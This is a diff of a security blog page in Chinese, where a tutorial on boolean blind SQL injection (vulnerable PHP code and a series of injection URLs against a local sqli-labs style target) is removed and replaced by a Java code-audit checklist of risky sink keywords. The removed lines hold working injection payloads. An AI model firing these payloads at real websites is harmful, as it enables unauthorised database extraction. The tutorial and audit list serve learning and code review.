@@ -19,7 +19,7 @@
     <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
 
 
-<title>1.3.1-SQL注入-SQL盲注-布尔盲注 | tea9のblog</title>
+<title>java代码审计 | tea9のblog</title>
 
 
 
@@ -202,7 +202,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">1.3.1-SQL注入-SQL盲注-布尔盲注</h1>
+            <h1 class="post-title">java代码审计</h1>
             
                 <div class="post-meta">
                     
@@ -211,77 +211,21 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">六月 21, 2018&nbsp;&nbsp;0:00:00</a>
+                        Date: <a href="#">八月 24, 2022&nbsp;&nbsp;15:53:29</a>
                         </span>
                     
-                    
-                        <span class="post-category">
-                    Category:
-                            
-                                <a href="/categories/Security/">Security</a>
-                            
-                        </span>
                     
                 </div>
             
         </header>
 
         <div class="post-content">
-            <h2 id="SQL盲注-布尔盲注"><a href="#SQL盲注-布尔盲注" class="headerlink" title="SQL盲注-布尔盲注"></a>SQL盲注-布尔盲注</h2><h3 id="01布尔盲注原理"><a href="#01布尔盲注原理" class="headerlink" title="01布尔盲注原理"></a>01布尔盲注原理</h3><pre><code>$id=$_GET[&#39;id&#39;];
-$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1 &quot;;
-$result=mysql_query($sql);
-$row=mysql_fetch_array($result);
-if($row)
-&#123;
-    echo &quot;Right&quot;;
-&#125;
-else
-&#123;
-    echo &quot;Wrong&quot;;
-&#125;
-</code></pre>
-<p>代码存在SQL注入漏洞<br>然而页面即不会回显数据，也不会回显错误信息  </p>
-<p>只返回 “Right” 与 “Wrong”   </p>
-<p>这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”和“假”来识别我们的判断是否正确，这既是布尔盲注！  </p>
-<p>正确请求，id&#x3D;1 -&gt; 返回 id&#x3D;1的数据  </p>
-<p>错误请求，id&#x3D;1’ -&gt; 返回 与正确页面不同的页面<br>1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id&#x3D;1 and left((select version()),1)&#x3D;5–+<br>2.想办法构造语句，判断数据库中内容的值<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/01.jpeg"></p>
-<h3 id="02布尔盲注方法"><a href="#02布尔盲注方法" class="headerlink" title="02布尔盲注方法"></a>02布尔盲注方法</h3><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  </p>
-<pre><code>left() left(database(),1)&gt;&#39;s&#39;
-        database()显示数据库名称，left(a,b)从左侧截取a的前b位
-regexp select user() regexp &#39;^r&#39;
-        正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
-like	select user() like &#39;ro%&#39;
-        与regexp类似，使用like进行匹配
-substr()  ascii(substr((select database()),1,1))=98
-ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
-ord()	ord(mid((select user()),1,1))=114
-mid()	mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/02.jpeg"></p>
-<p><a target="_blank" rel="noopener" href="http://www.runoob.com/mysql/mysql-regexp.html">MySql正则表达式</a></p>
-<p>注入点： </p>
-<pre><code>http://localhost:90/Less-8/?id=1&#39;
-http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;a&#39;--+
-http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ 显示正确第一位为s
+            <h2 id="sql注入关键字"><a href="#sql注入关键字" class="headerlink" title="sql注入关键字"></a>sql注入关键字</h2><p>Statement<br>createStatement<br>like ‘%${<br>in(${<br>select<br>update<br>insert</p>
+<h2 id="文件上传关键字"><a href="#文件上传关键字" class="headerlink" title="文件上传关键字"></a>文件上传关键字</h2><p>org.apache.commons.fileupload<br>java.io.File<br>MultipartFile<br>RequestMethod<br>MultipartHttpServletRequest<br>CommonsMutipartResolver</p>
+<h2 id="jsp前后端交互功能代码"><a href="#jsp前后端交互功能代码" class="headerlink" title="jsp前后端交互功能代码"></a>jsp前后端交互功能代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=</span><br><span class="line">$&#123;</span><br><span class="line">&lt;c:if</span><br><span class="line">&lt;c:forEach</span><br><span class="line">ModelAndView</span><br><span class="line">ModelMap</span><br><span class="line">Model</span><br><span class="line">request.getParameter</span><br><span class="line">request.setAttribute</span><br><span class="line">response.getWriter().print()</span><br><span class="line">response.getWriter().writer()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-http://localhost:90/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+ 第一个表名称字符
-
-http://localhost:90/Less-8/?id=1&#39; and (select database() regexp &#39;^s&#39;)--+
-
-http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39;)--+
-
-http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;e%&#39;)--+
-
-http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+
-
-http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/ascii.jpg"></p>
-<h2 id="burp操作步骤"><a href="#burp操作步骤" class="headerlink" title="burp操作步骤"></a>burp操作步骤</h2><p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/03.png"></p>
-<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/04.jpg"></p>
-<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/05.png"></p>
-<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/06.png"></p>
-<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/05/07.jpg"></p>
+<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>java.io.File 文件读取且路径可控<br>根据经验判断Paths path System.getProperty(“user.dir”)<br>路由path&#x2F;* file* </p>
+<h2 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h2><p>redirect<br>sendRedirect<br>ModelAndView<br>Location<br>addAttribute</p>
 
         </div>
 
@@ -296,7 +240,7 @@ http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from infor
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://tea9.xyz/post/2904355367.html">http://tea9.xyz/post/2904355367.html</a></span>
+                        <span><a href="http://tea9.xyz/post/4270118160.html">http://tea9.xyz/post/4270118160.html</a></span>
                     </p>
                 
                 
@@ -319,10 +263,6 @@ http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from infor
                 <span>Tag(s):</span>
                 <span class="tag">
                     
-                    
-                        <a href="/tags/web/"># web</a>
-                    
-                        
                 </span>
             </div>
             <div>
@@ -333,10 +273,8 @@ http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from infor
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/post/2304481464.html">android微信第三方登录1</a>
             
-            
-            <a class="next" rel="next" href="/post/273860866.html">android微信第三方登录2</a>
+            <a class="next" rel="next" href="/post/2576833618.html">swagger敏感信息泄露路径</a>
             
         </section>
     </article>
